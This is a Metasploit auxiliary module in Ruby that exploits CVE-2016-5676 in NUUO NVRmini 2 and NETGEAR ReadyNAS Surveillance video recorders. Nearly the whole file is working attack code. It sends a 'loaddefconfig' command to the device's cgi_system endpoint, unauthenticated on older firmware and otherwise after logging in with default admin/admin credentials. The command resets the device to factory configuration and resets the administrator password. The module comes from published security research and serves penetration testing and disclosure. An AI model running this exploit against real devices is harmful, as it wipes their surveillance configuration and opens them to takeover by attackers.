##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Default Configuration Load and Administrator Password Reset',
      'Description' => %q{
        The NVRmini 2 Network Video Recorded and the ReadyNAS Surveillance application are vulnerable
        to an administrator password reset on the exposed web management interface.
        Note that this only works for unauthenticated attackers in earlier versions of the Nuuo firmware
        (before v1.7.6), otherwise you need an administrative user password.
        This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance.
        It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested
        in those devices.
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2016-5676'],
          ['US-CERT-VU', '856152'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-nvr-vulns.txt'],
          ['URL', 'https://seclists.org/bugtraq/2016/Aug/45']
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Aug 4 2016'))

    register_options(
      [
        Opt::RPORT(8081),
        OptString.new('TARGETURI', [true,  "Application path", '/']),
        OptString.new('USERNAME', [false, 'The username to login as', 'admin']),
        OptString.new('PASSWORD', [false, 'Password for the specified username', 'admin']),
      ])
  end


  def run
    res = send_request_cgi({
        'uri' => normalize_uri(datastore['TARGETURI'], "cgi-bin", "cgi_system"),
        'vars_get' => { 'cmd' => "loaddefconfig" }
    })

    if res && res.code == 401
      res = send_request_cgi({
              'method' => 'POST',
              'uri' => normalize_uri(datastore['TARGETURI'], "login.php"),
              'vars_post' => {
                'user' => datastore['USERNAME'],
                'pass' => datastore['PASSWORD'],
                'submit' => "Login"
              }
      })
      if res && (res.code == 200 || res.code == 302)
        cookie = res.get_cookies
      else
        fail_with(Failure::Unknown, "#{peer} - A valid username / password is needed to reset the device.")
      end
      res = send_request_cgi({
          'uri' => normalize_uri(datastore['TARGETURI'], "cgi-bin", "cgi_system"),
          'cookie' => cookie,
          'vars_get' => { 'cmd' => "loaddefconfig" }
      })
    end

    if res && res.code == 200 && res.body.to_s =~ /load default configuration ok/
      print_good("#{peer} - Device has been reset to the default configuration.")
    else
      print_error("#{peer} - Failed to reset device.")
    end
  end
end
